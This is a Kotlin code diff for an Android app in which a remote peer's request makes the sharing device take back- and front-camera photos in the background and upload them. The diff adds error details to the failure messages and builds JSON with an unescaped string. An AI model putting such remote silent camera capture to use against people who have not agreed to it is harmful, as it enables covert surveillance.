@@ -497,7 +497,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         val tip = when (ack) {
                             "camera" -> "共享方已收到拍照请求"
                             "capturing" -> "共享方正在后台拍照..."
-                            "shot-failed" -> "共享方拍照失败，请稍后重试"
+                            "shot-failed" -> "共享方拍照失败: ${obj.optString("error", "未知错误")}"
                             else -> "共享方处理中"
                         }
                         runOnUiThread { Toast.makeText(this, tip, Toast.LENGTH_SHORT).show() }
@@ -710,15 +710,17 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         Thread {
             try {
                 val shot = CameraCapture.capture(ctx)
-                if (shot == null) {
-                    p?.sendControl("""{"type":"album-result","ack":"shot-failed"}""")
+                val err = shot?.error
+                if (shot == null || err != null) {
+                    val reason = err ?: "未知错误"
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"$reason"}""")
                     return@Thread
                 }
                 val b64List = ArrayList<String>()
                 shot.backJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 shot.frontJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 if (b64List.isEmpty()) {
-                    p?.sendControl("""{"type":"album-result","ack":"shot-failed"}""")
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"无照片"}""")
                     return@Thread
                 }
                 AlbumUploader.uploadB64Images(
